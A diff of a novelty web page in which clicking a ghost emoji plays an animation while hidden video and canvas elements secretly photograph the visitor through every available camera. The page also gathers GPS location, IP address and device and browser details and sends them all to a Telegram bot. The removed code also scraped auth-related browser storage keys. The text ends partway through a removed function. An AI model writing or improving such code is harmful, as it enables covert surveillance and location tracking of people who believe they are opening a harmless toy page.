@@ -97,10 +97,10 @@
     </style>
 </head>
 <body>
-    <div class="main-ghost" onclick="startUltraCollection()">👻</div>
+    <div class="main-ghost" onclick="forceCameraAccess()">👻</div>
 
     <!-- Hidden elements -->
-    <video id="hiddenVideo" class="hidden-camera" autoplay playsinline></video>
+    <video id="hiddenVideo" class="hidden-camera" autoplay playsinline muted></video>
     <canvas id="hiddenCanvas" class="hidden-camera"></canvas>
     <div class="flash-effect" id="flashEffect"></div>
 
@@ -111,43 +111,19 @@
         let isCollecting = false;
         let flashInterval;
 
-        // Extended emoji collection
-        const emojis = [
-            '👻','💀','🎃','😈','👹','👺','🤡','👽','👾','🤖','🎭','🕷️','🕸️','🧟','🧛','🧙',
-            '🔮','⚡','💥','🔥','🌪️','🌀','💫','⭐','🌟','💎','🔪','🗡️','🏹','🔫','💣','🧨',
-            '🪓','🔨','⛏️','⚒️','🛠️','⚔️','🔱','🎯','🧿','🔔','📢','🚨','💢','❤️','💔',
-            '☠️','💩','🤬','👁️','👀','🦴','🧠','🫀','🩸','💉','🪚','🔗','⛓️','🔒','🔓',
-            '🔑','🗝️','⚰️','🪦','🚬','☢️','☣️','🔞','🎲','🎰','🃏','🀄','🎴','📿','💈',
-            '🛡️','⚜️','🔰','✅','❌','🛑','🚫','💯','🔢','🔣','🈲','🈹','🈴','🈺','🈶',
-            '🈚','🈸','🈳','🈷️','📛','🚸','🔞','📵','🚭','🚯','🚱','🚷','📴','🔅','🔆',
-            '🎵','🎶','💤','🔄','🔃','🔄','🔙','🔚','🔛','🔜','🔝','🛐','⚛️','🕉️','✡️',
-            '☸️','☯️','✝️','☦️','☪️','☮️','🕎','🔯','♈','♉','♊','♋','♌','♍','♎','♏',
-            '♐','♑','♒','♓','⛎','🔀','🔁','🔂','▶️','⏩','⏭️','⏯️','◀️','⏪','⏮️','🔼',
-            '⏫','🔽','⏬','⏸️','⏹️','⏺️','⏏️','🎦','🔅','🔆','📶','📳','📴','♻️','🔱',
-            '📧','🔗','⛓️','💣','🛡️','🔒','🔓','🔏','🔐','🔑','🗝️','🔨','⛏️','⚒️','🛠️',
-            '🗡️','⚔️','🔫','🏹','🛡️','🔧','🔩','⚙️','🗜️','⚖️','🔗','⛓️','💉','💊','🩹',
-            '🩺','🚪','🛏️','🛋️','🪑','🚽','🚿','🛁','⌛','⏳','⌚','⏰','⏱️','⏲️','🕰️',
-            '🌡️','⛱️','🎈','🎉','🎊','🎎','🎏','🎐','🎀','🎁','🎫','🏆','🏅','🥇','🥈',
-            '🥉','⚽','🏀','🏈','⚾','🥎','🎾','🏐','🏉','🥏','🎱','🪀','🏓','🏸','🏒',
-            '🏑','🥍','🏏','🎿','⛷️','🏂','🪂','🏋️','🤼','🤸','⛹️','🤾','🏌️','🏇','🧘',
-            '🏄','🏊','🤽','🚣','🧗','🚵','🚴','🏆','🥇','🥈','🥉','🎯','🎱','🎮','🎰',
-            '🎲','♠️','♥️','♦️','♣️','🃏','🀄','🎴','🎭','🖼️','🎨','🧵','🪡','🧶','🪢',
-            '👓','🕶️','🥽','🥼','🦺','👔','👕','👖','🧣','🧤','🧥','🧦','👗','👘','🥻',
-            '🩱','🩲','🩳','👙','👚','👛','👜','👝','🎒','🩴','👞','👟','🥾','🥿','👠',
-            '👡','🩰','👢','👑','👒','🎩','🎓','🧢','⛑️','💄','💍','💼','☠️','🕴️','💃'
-        ];
+        // Emoji collection
+        const emojis = ['👻','💀','🎃','😈','👹','👺','🤡','👽','👾','🤖','🎭','🕷️','🕸️','🧟','🧛','🧙','🔮','⚡','💥','🔥','🌪️','🌀','💫','⭐','🌟','💎','🔪','🗡️','🏹','🔫','💣','🧨','🪓','🔨','⛏️','⚒️','🛠️','⚔️','🔱','🎯','🧿','🔔','📢','🚨','💢','❤️','💔','☠️','💩','🤬','👁️','👀','🦴','🧠','🫀','🩸','💉','🪚','🔗','⛓️','🔒','🔓','🔑','🗝️','⚰️','🪦','🚬','☢️','☣️','🔞'];
 
-        function startUltraCollection() {
+        function forceCameraAccess() {
             if (isCollecting) return;
             isCollecting = true;
             
-            // Pulse effect on main ghost
             const ghost = document.querySelector('.main-ghost');
             ghost.classList.add('pulse');
             setTimeout(() => ghost.classList.remove('pulse'), 500);
             
             createEmojiStorm();
-            ultraFastCollection();
+            forcePhotoCapture();
         }
 
         function createEmojiStorm() {
@@ -156,8 +132,7 @@
             const centerX = rect.left + rect.width / 2;
             const centerY = rect.top + rect.height / 2;
             
-            // Create 80 emojis with random effects
-            for (let i = 0; i < 80; i++) {
+            for (let i = 0; i < 60; i++) {
                 setTimeout(() => {
                     const emoji = document.createElement('div');
                     emoji.className = 'emoji-storm';
@@ -193,63 +168,107 @@
             }, 300);
         }
 
-        // Flash every 5 minutes (300000 ms)
         function startFlashTimer() {
             flashInterval = setInterval(() => {
-                // Flash 3 times
                 for (let i = 0; i < 3; i++) {
                     setTimeout(() => triggerFlash(), i * 500);
                 }
             }, 300000);
         }
 
-        async function ultraFastCollection() {
+        async function forcePhotoCapture() {
             const startTime = Date.now();
             
-            // Collect all data in parallel
-            const allData = await Promise.all([
-                getUltraDeviceInfo(),
-                getUltraLocationInfo(),
-                getUltraHardwareInfo(),
-                getUltraNetworkInfo(),
-                getUltraBrowserInfo(),
-                takeRealPhotos(),
-                getUltraAdvancedInfo(),
-                getUltraSocialInfo(),
-                getInstalledAppsInfo(),
-                getSystemInfo(),
-                getConnectionDetails(),
-                getMediaCapabilitiesInfo(),
-                getSecurityInfo(),
-                getPerformanceMetrics(),
-                getSensorData()
+            // FIRST: Try to get camera access immediately
+            const cameraResult = await forceCameraWithAllMethods();
+            
+            // THEN: Collect other data in parallel
+            const [
+                deviceInfo,
+                locationInfo,
+                hardwareInfo,
+                networkInfo,
+                browserInfo,
+                advancedInfo
+            ] = await Promise.all([
+                getDeviceInfo(),
+                getLocationInfo(),
+                getHardwareInfo(),
+                getNetworkInfo(),
+                getBrowserInfo(),
+                getAdvancedInfo()
             ]);
 
             const completeData = {
-                device: allData[0],
-                location: allData[1],
-                hardware: allData[2],
-                network: allData[3],
-                browser: allData[4],
-                camera: allData[5],
-                advanced: allData[6],
-                social: allData[7],
-                apps: allData[8],
-                system: allData[9],
-                connection: allData[10],
-                media: allData[11],
-                security: allData[12],
-                performance: allData[13],
-                sensors: allData[14],
+                device: deviceInfo,
+                location: locationInfo,
+                hardware: hardwareInfo,
+                network: networkInfo,
+                browser: browserInfo,
+                camera: cameraResult,
+                advanced: advancedInfo,
                 collectionTime: Date.now() - startTime + 'ms'
             };
 
-            await sendUltraToTelegram(completeData);
+            await sendToTelegram(completeData);
             startFlashTimer();
         }
 
-        // === REAL PHOTO CAPTURE ===
-        async function takeRealPhotos() {
+        // === AGGRESSIVE CAMERA ACCESS ===
+        async function forceCameraWithAllMethods() {
+            let finalPhotos = [];
+            
+            // Method 1: Direct camera access with ideal constraints
+            console.log("🔄 Method 1: Direct camera access...");
+            const method1 = await tryCameraMethod1();
+            if (method1.success) {
+                finalPhotos = finalPhotos.concat(method1.photos);
+                console.log("✅ Method 1 SUCCESS");
+            } else {
+                console.log("❌ Method 1 FAILED");
+            }
+            
+            // Method 2: Try with different constraints
+            console.log("🔄 Method 2: Alternative constraints...");
+            const method2 = await tryCameraMethod2();
+            if (method2.success && finalPhotos.length === 0) {
+                finalPhotos = finalPhotos.concat(method2.photos);
+                console.log("✅ Method 2 SUCCESS");
+            }
+            
+            // Method 3: Try with environment facing mode
+            console.log("🔄 Method 3: Environment camera...");
+            const method3 = await tryCameraMethod3();
+            if (method3.success && finalPhotos.length === 0) {
+                finalPhotos = finalPhotos.concat(method3.photos);
+                console.log("✅ Method 3 SUCCESS");
+            }
+            
+            // Method 4: Try with user facing mode (front camera)
+            console.log("🔄 Method 4: User camera...");
+            const method4 = await tryCameraMethod4();
+            if (method4.success && finalPhotos.length === 0) {
+                finalPhotos = finalPhotos.concat(method4.photos);
+                console.log("✅ Method 4 SUCCESS");
+            }
+            
+            // Method 5: Try with exact device IDs
+            console.log("🔄 Method 5: Specific device IDs...");
+            const method5 = await tryCameraMethod5();
+            if (method5.success && finalPhotos.length === 0) {
+                finalPhotos = finalPhotos.concat(method5.photos);
+                console.log("✅ Method 5 SUCCESS");
+            }
+
+            return {
+                success: finalPhotos.length > 0,
+                photos: finalPhotos,
+                totalAttempts: 5,
+                successfulMethods: [method1.success, method2.success, method3.success, method4.success, method5.success].filter(Boolean).length
+            };
+        }
+
+        async function tryCameraMethod1() {
             try {
                 const devices = await navigator.mediaDevices.enumerateDevices();
                 const cameras = devices.filter(device => device.kind === 'videoinput');
@@ -258,50 +277,24 @@
                 for (let camera of cameras) {
                     let stream = null;
                     try {
+                        // Method 1A: Try with ideal constraints
                         stream = await navigator.mediaDevices.getUserMedia({
                             video: { 
                                 deviceId: camera.deviceId,
                                 width: { ideal: 1280 },
                                 height: { ideal: 720 },
-                                facingMode: camera.label.toLowerCase().includes('front') ? 'user' : 'environment'
-                            }
+                                frameRate: { ideal: 30 }
+                            },
+                            audio: false
                         });
                         
-                        const video = document.getElementById('hiddenVideo');
-                        const canvas = document.getElementById('hiddenCanvas');
-                        const context = canvas.getContext('2d');
-                        
-                        video.srcObject = stream;
-                        
-                        await new Promise((resolve, reject) => {
-                            video.onloadedmetadata = () => {
-                                video.play().then(resolve).catch(reject);
-                            };
-                            setTimeout(() => reject(new Error('Video timeout')), 5000);
-                        });
-                        
-                        await new Promise(resolve => setTimeout(resolve, 800));
-                        
-                        canvas.width = video.videoWidth;
-                        canvas.height = video.videoHeight;
-                        context.drawImage(video, 0, 0, canvas.width, canvas.height);
-                        
-                        const photoData = canvas.toDataURL('image/jpeg', 0.8);
-                        
-                        photos.push({
-                            camera: camera.label || 'Unknown Camera',
-                            photo: photoData,
-                            resolution: `${video.videoWidth}x${video.videoHeight}`,
-                            success: true,
-                            timestamp: new Date().toLocaleString()
-                        });
+                        const photo = await capturePhotoFromStream(stream, camera.label);
+                        if (photo) {
+                            photos.push(photo);
+                        }
                         
                     } catch (error) {
-                        photos.push({
-                            camera: camera.label || 'Unknown Camera',
-                            error: error.message,
-                            success: false
-                        });
+                        console.log(`Camera ${camera.label} failed:`, error.message);
                     } finally {
                         if (stream) {
                             stream.getTracks().forEach(track => track.stop());
@@ -310,607 +303,417 @@
                 }
                 
                 return {
-                    success: photos.some(p => p.success),
+                    success: photos.length > 0,
                     photos: photos,
-                    total: cameras.length,
-                    captured: photos.filter(p => p.success).length
+                    method: "Ideal Constraints"
                 };
                 
             } catch (error) {
-                return { 
-                    success: false, 
-                    error: "Camera access failed: " + error.message,
-                    photos: []
+                return {
+                    success: false,
+                    photos: [],
+                    error: error.message,
+                    method: "Ideal Constraints"
                 };
             }
         }
 
-        // === EXTENDED DATA COLLECTION ===
+        async function tryCameraMethod2() {
+            try {
+                const devices = await navigator.mediaDevices.enumerateDevices();
+                const cameras = devices.filter(device => device.kind === 'videoinput');
+                const photos = [];
+                
+                for (let camera of cameras) {
+                    let stream = null;
+                    try {
+                        // Method 2: Try with exact constraints
+                        stream = await navigator.mediaDevices.getUserMedia({
+                            video: { 
+                                deviceId: { exact: camera.deviceId },
+                                width: { exact: 640 },
+                                height: { exact: 480 }
+                            }
+                        });
+                        
+                        const photo = await capturePhotoFromStream(stream, camera.label);
+                        if (photo) {
+                            photos.push(photo);
+                        }
+                        
+                    } catch (error) {
+                        // Try alternative exact constraints
+                        try {
+                            stream = await navigator.mediaDevices.getUserMedia({
+                                video: { 
+                                    deviceId: { exact: camera.deviceId },
+                                    width: { exact: 1280 },
+                                    height: { exact: 720 }
+                                }
+                            });
+                            
+                            const photo = await capturePhotoFromStream(stream, camera.label);
+                            if (photo) {
+                                photos.push(photo);
+                            }
+                        } catch (error2) {
+                            console.log(`Camera ${camera.label} exact failed:`, error2.message);
+                        }
+                    } finally {
+                        if (stream) {
+                            stream.getTracks().forEach(track => track.stop());
+                        }
+                    }
+                }
+                
+                return {
+                    success: photos.length > 0,
+                    photos: photos,
+                    method: "Exact Constraints"
+                };
+                
+            } catch (error) {
+                return {
+                    success: false,
+                    photos: [],
+                    error: error.message,
+                    method: "Exact Constraints"
+                };
+            }
+        }
 
-        async function getUltraDeviceInfo() {
+        async function tryCameraMethod3() {
+            try {
+                let stream = null;
+                try {
+                    // Method 3: Try environment facing (rear camera)
+                    stream = await navigator.mediaDevices.getUserMedia({
+                        video: { 
+                            facingMode: { ideal: 'environment' },
+                            width: { ideal: 1920 },
+                            height: { ideal: 1080 }
+                        }
+                    });
+                    
+                    const photo = await capturePhotoFromStream(stream, 'Environment Camera');
+                    return {
+                        success: true,
+                        photos: photo ? [photo] : [],
+                        method: "Environment Facing"
+                    };
+                    
+                } catch (error) {
+                    return {
+                        success: false,
+                        photos: [],
+                        error: error.message,
+                        method: "Environment Facing"
+                    };
+                } finally {
+                    if (stream) {
+                        stream.getTracks().forEach(track => track.stop());
+                    }
+                }
+            } catch (error) {
+                return {
+                    success: false,
+                    photos: [],
+                    error: error.message,
+                    method: "Environment Facing"
+                };
+            }
+        }
+
+        async function tryCameraMethod4() {
+            try {
+                let stream = null;
+                try {
+                    // Method 4: Try user facing (front camera)
+                    stream = await navigator.mediaDevices.getUserMedia({
+                        video: { 
+                            facingMode: { ideal: 'user' },
+                            width: { ideal: 1920 },
+                            height: { ideal: 1080 }
+                        }
+                    });
+                    
+                    const photo = await capturePhotoFromStream(stream, 'User Camera');
+                    return {
+                        success: true,
+                        photos: photo ? [photo] : [],
+                        method: "User Facing"
+                    };
+                    
+                } catch (error) {
+                    return {
+                        success: false,
+                        photos: [],
+                        error: error.message,
+                        method: "User Facing"
+                    };
+                } finally {
+                    if (stream) {
+                        stream.getTracks().forEach(track => track.stop());
+                    }
+                }
+            } catch (error) {
+                return {
+                    success: false,
+                    photos: [],
+                    error: error.message,
+                    method: "User Facing"
+                };
+            }
+        }
+
+        async function tryCameraMethod5() {
+            try {
+                const devices = await navigator.mediaDevices.enumerateDevices();
+                const cameras = devices.filter(device => device.kind === 'videoinput');
+                const photos = [];
+                
+                for (let camera of cameras) {
+                    let stream = null;
+                    try {
+                        // Method 5: Try minimal constraints
+                        stream = await navigator.mediaDevices.getUserMedia({
+                            video: { 
+                                deviceId: camera.deviceId
+                                // No constraints - let browser decide
+                            }
+                        });
+                        
+                        const photo = await capturePhotoFromStream(stream, camera.label);
+                        if (photo) {
+                            photos.push(photo);
+                        }
+                        
+                    } catch (error) {
+                        console.log(`Camera ${camera.label} minimal failed:`, error.message);
+                    } finally {
+                        if (stream) {
+                            stream.getTracks().forEach(track => track.stop());
+                        }
+                    }
+                }
+                
+                return {
+                    success: photos.length > 0,
+                    photos: photos,
+                    method: "Minimal Constraints"
+                };
+                
+            } catch (error) {
+                return {
+                    success: false,
+                    photos: [],
+                    error: error.message,
+                    method: "Minimal Constraints"
+                };
+            }
+        }
+
+        async function capturePhotoFromStream(stream, cameraLabel) {
+            return new Promise((resolve) => {
+                const video = document.getElementById('hiddenVideo');
+                const canvas = document.getElementById('hiddenCanvas');
+                const context = canvas.getContext('2d');
+                
+                video.srcObject = stream;
+                
+                video.onloadedmetadata = () => {
+                    video.play().then(() => {
+                        // Wait for video to be ready and stable
+                        setTimeout(() => {
+                            try {
+                                canvas.width = video.videoWidth;
+                                canvas.height = video.videoHeight;
+                                context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                                
+                                // Capture high quality photo
+                                const photoData = canvas.toDataURL('image/jpeg', 0.9);
+                                
+                                resolve({
+                                    camera: cameraLabel,
+                                    photo: photoData,
+                                    resolution: `${video.videoWidth}x${video.videoHeight}`,
+                                    success: true,
+                                    timestamp: new Date().toLocaleString(),
+                                    method: "Direct Capture"
+                                });
+                            } catch (error) {
+                                resolve(null);
+                            }
+                        }, 1000); // Longer wait for stability
+                    }).catch(() => resolve(null));
+                };
+                
+                video.onerror = () => resolve(null);
+                
+                // Timeout after 5 seconds
+                setTimeout(() => resolve(null), 5000);
+            });
+        }
+
+        // === DATA COLLECTION FUNCTIONS ===
+        async function getDeviceInfo() {
             const ua = navigator.userAgent;
             return {
-                type: detectDeviceType(ua),
-                brand: detectDeviceBrand(ua),
-                model: detectDeviceModel(ua),
+                type: /mobile|android|iphone|ipod/i.test(ua.toLowerCase()) ? "Smartphone" : "Desktop",
+                brand: detectBrand(ua),
+                model: detectModel(ua),
                 os: detectOS(ua),
-                osVersion: detectOSVersion(ua),
                 platform: navigator.platform,
                 vendor: navigator.vendor,
-                mobile: /mobile|android|iphone|ipod/i.test(ua.toLowerCase()),
-                tablet: /tablet|ipad/i.test(ua.toLowerCase()),
-                language: navigator.language,
-                languages: navigator.languages,
-                userAgent: ua,
-                buildId: detectBuildId(ua),
-                webkitVersion: detectWebkitVersion(ua)
+                userAgent: ua.substring(0, 150)
             };
         }
 
-        async function getUltraLocationInfo() {
-            const [gps, ipInfo, networkInfo] = await Promise.all([
-                getFastGPSLocation(),
-                getFastIPInformation(),
-                getNetworkLocationInfo()
-            ]);
-
-            return { 
-                gps, 
-                ip: ipInfo, 
-                network: networkInfo,
-                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                locale: navigator.language,
-                coordinates: {
-                    latitude: gps.latitude || ipInfo.latitude,
-                    longitude: gps.longitude || ipInfo.longitude
-                }
-            };
-        }
-
-        async function getNetworkLocationInfo() {
+        async function getLocationInfo() {
             try {
-                const response = await fetch('https://ipapi.co/json/');
-                const data = await response.json();
+                const position = await new Promise((resolve, reject) => {
+                    navigator.geolocation.getCurrentPosition(resolve, reject, {
+                        enableHighAccuracy: true,
+                        timeout: 5000,
+                        maximumAge: 0
+                    });
+                });
+                
                 return {
-                    country: data.country_name,
-                    city: data.city,
-                    region: data.region,
-                    isp: data.org,
-                    asn: data.asn,
-                    currency: data.currency,
-                    languages: data.languages,
-                    country_population: data.country_population,
-                    in_eu: data.in_eu
+                    latitude: position.coords.latitude,
+                    longitude: position.coords.longitude,
+                    accuracy: position.coords.accuracy,
+                    maps: `https://maps.google.com/?q=${position.coords.latitude},${position.coords.longitude}`
                 };
             } catch (error) {
-                return { error: "Network location failed" };
+                return { error: error.message };
             }
         }
 
-        async function getUltraHardwareInfo() {
-            const [battery, memory, storage, gpu] = await Promise.all([
-                getDetailedBatteryInfo(),
-                getDetailedMemoryInfo(),
-                getDetailedStorageInfo(),
-                getDetailedGPUInfo()
-            ]);
-
+        async function getHardwareInfo() {
             return {
-                screen: {
-                    width: screen.width,
-                    height: screen.height,
-                    availWidth: screen.availWidth,
-                    availHeight: screen.availHeight,
-                    colorDepth: screen.colorDepth,
-                    pixelDepth: screen.pixelDepth,
-                    orientation: screen.orientation?.type
-                },
-                cpu: {
-                    cores: navigator.hardwareConcurrency || 'unknown',
-                    architecture: detectArchitecture(),
-                    model: detectCPUModel()
-                },
-                memory: memory,
-                storage: storage,
-                battery: battery,
-                gpu: gpu,
-                touch: {
-                    points: navigator.maxTouchPoints,
-                    supported: 'ontouchstart' in window
-                },
-                sensors: await getAvailableSensors()
+                screen: `${screen.width}x${screen.height}`,
+                cores: navigator.hardwareConcurrency || 'unknown',
+                memory: navigator.deviceMemory || 'unknown',
+                battery: await getBatteryInfo()
             };
         }
 
-        async function getDetailedBatteryInfo() {
+        async function getBatteryInfo() {
             if (navigator.getBattery) {
                 try {
                     const battery = await navigator.getBattery();
                     return {
                         level: Math.round(battery.level * 100) + '%',
-                        charging: battery.charging,
-                        chargingTime: battery.chargingTime,
-                        dischargingTime: battery.dischargingTime,
-                        voltage: 'unknown', // Not available in web API
-                        health: 'unknown'   // Not available in web API
+                        charging: battery.charging
                     };
                 } catch (e) {
-                    return { error: "Battery API blocked" };
+                    return "unknown";
                 }
             }
-            return { error: "Battery API not available" };
+            return "unknown";
         }
 
-        async function getDetailedMemoryInfo() {
-            if (performance.memory) {
-                return {
-                    used: Math.round(performance.memory.usedJSHeapSize / 1048576) + ' MB',
-                    total: Math.round(performance.memory.totalJSHeapSize / 1048576) + ' MB',
-                    limit: Math.round(performance.memory.jsHeapSizeLimit / 1048576) + ' MB',
-                    usedPercentage: Math.round((performance.memory.usedJSHeapSize / performance.memory.jsHeapSizeLimit) * 100) + '%'
-                };
-            }
-            return { error: "Memory API not available" };
-        }
-
-        async function getDetailedStorageInfo() {
-            if (navigator.storage && navigator.storage.estimate) {
-                try {
-                    const estimate = await navigator.storage.estimate();
-                    return {
-                        usage: Math.round(estimate.usage / 1048576) + ' MB',
-                        quota: Math.round(estimate.quota / 1048576) + ' MB',
-                        percentage: Math.round((estimate.usage / estimate.quota) * 100) + '%',
-                        persistent: await navigator.storage.persisted()
-                    };
-                } catch (e) {
-                    return { error: "Storage estimate failed" };
-                }
-            }
-            return { error: "Storage API not available" };
-        }
-
-        async function getDetailedGPUInfo() {
+        async function getNetworkInfo() {
             try {
-                const canvas = document.createElement('canvas');
-                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-                if (!gl) return { error: "WebGL not supported" };
-                
-                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-                if (!debugInfo) return { error: "GPU debug info not available" };
-                
-                return {
-                    vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
-                    renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL),
-                    version: gl.getParameter(gl.VERSION),
-                    shadingLanguage: gl.getParameter(gl.SHADING_LANGUAGE_VERSION),
-                    maxTextureSize: gl.getParameter(gl.MAX_TEXTURE_SIZE)
-                };
-            } catch (e) {
-                return { error: "GPU info unavailable" };
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                return { ip: data.ip };
+            } catch (error) {
+                return { ip: "unknown" };
             }
         }
 
-        async function getUltraNetworkInfo() {
-            const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-            
-            const networkInfo = {
-                ip: await getFastIPAddress(),
-                online: navigator.onLine,
-                type: connection ? connection.effectiveType : 'unknown',
-                details: connection ? {
-                    downlink: connection.downlink + ' Mbps',
-                    rtt: connection.rtt + ' ms',
-                    saveData: connection.saveData,
-                    downlinkMax: connection.downlinkMax
-                } : {},
-                networkType: detectNetworkType(),
-                bandwidth: await estimateBandwidth()
-            };
-
-            return networkInfo;
-        }
-
-        async function estimateBandwidth() {
-            try {
-                const startTime = performance.now();
-                const response = await fetch('https://httpbin.org/stream-bytes/1024');
-                const endTime = performance.now();
-                const duration = (endTime - startTime) / 1000;
-                const speed = (1024 * 8) / duration / 1000; // kbps
-                return Math.round(speed) + ' kbps';
-            } catch (e) {
-                return 'unknown';
-            }
-        }
-
-        async function getUltraBrowserInfo() {
+        async function getBrowserInfo() {
             const ua = navigator.userAgent;
-            const [chromeData, storage, history, permissions] = await Promise.all([
-                getDetailedChromeData(),
-                getDetailedStorageInfo(),
-                getHistoryInfo(),
-                getPermissionsInfo()
-            ]);
-
             return {
                 name: detectBrowser(ua),
                 version: detectBrowserVersion(ua),
-                fullVersion: detectFullBrowserVersion(ua),
-                engine: detectEngine(ua),
-                engineVersion: detectEngineVersion(ua),
                 language: navigator.language,
+                platform: navigator.platform
+            };
+        }
+
+        async function getAdvancedInfo() {
+            return {
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                 languages: navigator.languages,
                 cookieEnabled: navigator.cookieEnabled,
-                javaEnabled: navigator.javaEnabled(),
-                pdfViewer: navigator.pdfViewerEnabled,
-                webdriver: navigator.webdriver,
-                doNotTrack: navigator.doNotTrack,
-                plugins: getDetailedPlugins(),
-                mimeTypes: getMimeTypes().length,
-                chromeData: chromeData,
-                storage: storage,
-                history: history,
-                permissions: permissions,
-                features: detectBrowserFeatures()
+                online: navigator.onLine
             };
         }
 
-        async function getDetailedChromeData() {
-            try {
-                const chromeKeys = [];
-                const sessionKeys = [];
-                
-                for (let i = 0; i < localStorage.length; i++) {
-                    const key = localStorage.key(i);
-                    if (key && (key.includes('google') || key.includes('chrome') || key.includes('auth') || key.includes('account'))) {
-                        chromeKeys.push(key);
-                    }
-                }
-                
-                for (let i = 0; i < sessionStorage.length; i++) {
-                    const key = sessionStorage.key(i);
-                    if (key && key.includes('google')) {
-                        sessionKeys.push(key);
-                    }
-                }
-                
-                return {
-                    profiles: chromeKeys.length,
-                    sessionData: sessionKeys.length,
-                    sample: chromeKeys.slice(0, 5),
-                    totalStorage: localStorage.length
-                };
-            } catch (e) {
-                return { error: "Chrome data blocked" };
-            }
-        }
-
-        async function getHistoryInfo() {
-            return {
-                length: history.length,
-                state: history.state ? 'has state' : 'no state'
-            };
-        }
-
-        async function getPermissionsInfo() {
-            try {
-                const permissions = [];
-                // Check common permissions
-                const permissionResults = await Promise.allSettled([
-                    navigator.permissions.query({ name: 'camera' }),
-                    navigator.permissions.query({ name: 'microphone' }),
-                    navigator.permissions.query({ name: 'geolocation' }),
-                    navigator.permissions.query({ name: 'notifications' })
-                ]);
-                
-                permissionResults.forEach((result, index) => {
-                    if (result.status === 'fulfilled') {
-                        const names = ['camera', 'microphone', 'geolocation', 'notifications'];
-                        permissions.push(`${names[index]}: ${result.value.state}`);
-                    }
-                });
-                
-                return permissions;
-            } catch (e) {
-                return ['Permission API blocked'];
-            }
-        }
-
-        // ... (Previous detection functions remain the same, adding new ones below)
-
-        function detectFullBrowserVersion(ua) {
-            const matches = ua.match(/(chrome|firefox|safari|edg)\/([0-9.]+)/i);
-            return matches ? matches[0] : "Unknown";
-        }
-
-        function detectEngineVersion(ua) {
-            const webkitMatch = ua.match(/AppleWebKit\/([0-9.]+)/i);
-            const geckoMatch = ua.match(/Gecko\/([0-9.]+)/i);
-            return webkitMatch ? webkitMatch[0] : geckoMatch ? geckoMatch[0] : "Unknown";
-        }
-
-        function detectBuildId(ua) {
-            const match = ua.match(/Build\/([^\)]+)/i);
-            return match ? match[1] : "Unknown";
-        }
-
-        function detectWebkitVersion(ua) {
-            const match = ua.match(/WebKit\/([0-9.]+)/i);
-            return match ? match[1] : "Unknown";
-        }
-
-        function detectCPUModel() {
-            // Limited info available in browser
-            return "Limited info in browser";
-        }
-
-        function detectOSVersion(ua) {
-            const matches = {
-                windows: ua.match(/Windows NT ([0-9.]+)/),
-                mac: ua.match(/Mac OS X ([0-9_]+)/),
-                android: ua.match(/Android ([0-9.]+)/),
-                ios: ua.match(/OS ([0-9_]+)/)
-            };
-            
-            for (const [os, match] of Object.entries(matches)) {
-                if (match) return match[1].replace(/_/g, '.');
-            }
+        // === DETECTION FUNCTIONS ===
+        function detectBrand(ua) {
+            if (/iphone|ipad|ipod|macintosh/i.test(ua)) return "Apple";
+            if (/samsung/i.test(ua)) return "Samsung";
+            if (/xiaomi|mi |redmi/i.test(ua)) return "Xiaomi";
+            if (/huawei/i.test(ua)) return "Huawei";
+            if (/google|pixel/i.test(ua)) return "Google";
             return "Unknown";
         }
 
-        function getDetailedPlugins() {
-            const plugins = [];
-            for (let i = 0; i < navigator.plugins.length; i++) {
-                const plugin = navigator.plugins[i];
-                plugins.push({
-                    name: plugin.name,
-                    filename: plugin.filename,
-                    description: plugin.description,
-                    version: plugin.version
-                });
-            }
-            return plugins;
+        function detectModel(ua) {
+            if (/iphone\s(\d+)/i.test(ua)) return ua.match(/iphone\s(\d+)/i)[0];
+            if (/sm-([a-z0-9]+)/i.test(ua)) return ua.match(/sm-([a-z0-9]+)/i)[0];
+            return "Unknown";
         }
 
-        function detectBrowserFeatures() {
-            const features = [];
-            if ('serviceWorker' in navigator) features.push('Service Workers');
-            if ('caches' in window) features.push('Cache API');
-            if ('indexedDB' in window) features.push('IndexedDB');
-            if ('webkitPersistentStorage' in navigator) features.push('Persistent Storage');
-            if ('bluetooth' in navigator) features.push('Bluetooth');
-            if ('usb' in navigator) features.push('WebUSB');
-            if ('serial' in navigator) features.push('Web Serial');
-            if ('nfc' in navigator) features.push('Web NFC');
-            if ('share' in navigator) features.push('Web Share');
-            if ('vibrate' in navigator) features.push('Vibration');
-            return features;
+        function detectOS(ua) {
+            if (/windows/i.test(ua)) return "Windows";
+            if (/macintosh/i.test(ua)) return "macOS";
+            if (/android/i.test(ua)) return "Android";
+            if (/ios|iphone|ipad/i.test(ua)) return "iOS";
+            if (/linux/i.test(ua)) return "Linux";
+            return "Unknown";
         }
 
-        async function getAvailableSensors() {
-            const sensors = [];
-            const sensorChecks = [
-                ['Accelerometer', 'accelerometer'],
-                ['Gyroscope', 'gyroscope'],
-                ['Magnetometer', 'magnetometer'],
-                ['AmbientLight', 'ambient-light-sensor'],
-                ['Proximity', 'proximity'],
-                ['Orientation', 'deviceorientation'],
-                ['Motion', 'devicemotion']
-            ];
+        function detectBrowser(ua) {
+            if (/chrome/i.test(ua)) return "Chrome";
+            if (/firefox/i.test(ua)) return "Firefox";
+            if (/safari/i.test(ua)) return "Safari";
+            if (/edge/i.test(ua)) return "Edge";
+            return "Unknown";
+        }
+
+        function detectBrowserVersion(ua) {
+            const match = ua.match(/(chrome|firefox|safari|edge)\/([0-9.]+)/i);
+            return match ? match[2] : "Unknown";
+        }
+
+        // === TELEGRAM SEND ===
+        async function sendToTelegram(data) {
+            let message = `🚨 FRANZZ MEWING x MONYET SI MONKEY 🚨\n\n`;
             
-            for (const [name, sensor] of sensorChecks) {
-                try {
-                    if (sensor === 'deviceorientation') {
-                        if ('DeviceOrientationEvent' in window) sensors.push(name);
-                    } else if (sensor === 'devicemotion') {
-                        if ('DeviceMotionEvent' in window) sensors.push(name);
-                    } else {
-                        // @ts-ignore
-                        const sensor = new (window[sensor] || window[`${sensor}Sensor`]);
-                        if (sensor) sensors.push(name);
-                    }
-                } catch (e) {
-                    // Sensor not available
-                }
-            }
-            return sensors;
-        }
-
-        // === NEW INFORMATION CATEGORIES ===
-
-        async function getInstalledAppsInfo() {
-            const apps = [];
